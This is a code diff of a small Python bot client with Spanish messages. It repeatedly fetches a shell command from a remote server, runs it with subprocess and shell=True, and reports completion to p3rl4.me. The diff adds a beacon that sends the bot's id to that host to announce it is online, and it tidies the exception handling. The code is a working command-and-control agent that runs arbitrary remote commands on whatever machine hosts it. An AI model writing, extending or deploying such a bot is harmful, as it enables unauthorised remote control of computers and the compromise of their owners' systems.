@@ -11,7 +11,7 @@ import sys
 def get_cmd():
     global cmd
     cmd = requests.get('http://10.43.143.51/getcmd')
-    print("EJECUTANDO ======"+ cmd.text + "======")
+    print("EJECUTANDO ====== "+ cmd.text + " ======")
     p1 = multiprocessing.Process(name="p1",target=run_ssh)
     p1.start()
 
@@ -20,14 +20,17 @@ def run_ssh():
     try:
         output = subprocess.check_output(cmd.text, shell=True).decode('utf-8')
         time.sleep(6)
-        requests.get('http://p3rl4.me/getcmd')
+        requests.get('http://p3rl4.me/cmdfinished')
         print(output)
-    except:
+    except Exception:
         print("Ha habido un error con su comando")
 
 
 def online():
-    pass
+    try:
+        requests.get('http://p3rl4.me/imonline?id='+id)
+    except Exception:
+        print("No hay conexion con el servidor")
 
 def main():
     while True:
@@ -35,7 +38,7 @@ def main():
         try:
             online()
             get_cmd()
-        except:
+        except Exception:
             print("Ha ocurrido un error, Seguramente el servidor no este en linea")
 
 if __name__ == '__main__':
@@ -46,6 +49,6 @@ if __name__ == '__main__':
         main()
     except KeyboardInterrupt:
         print("CERRANDO TODO :::::.......")
-    except:
+    except Exception:
         print("""Necesitas proporcionar un id numérico
 Ej: python3 bot.py 1""")
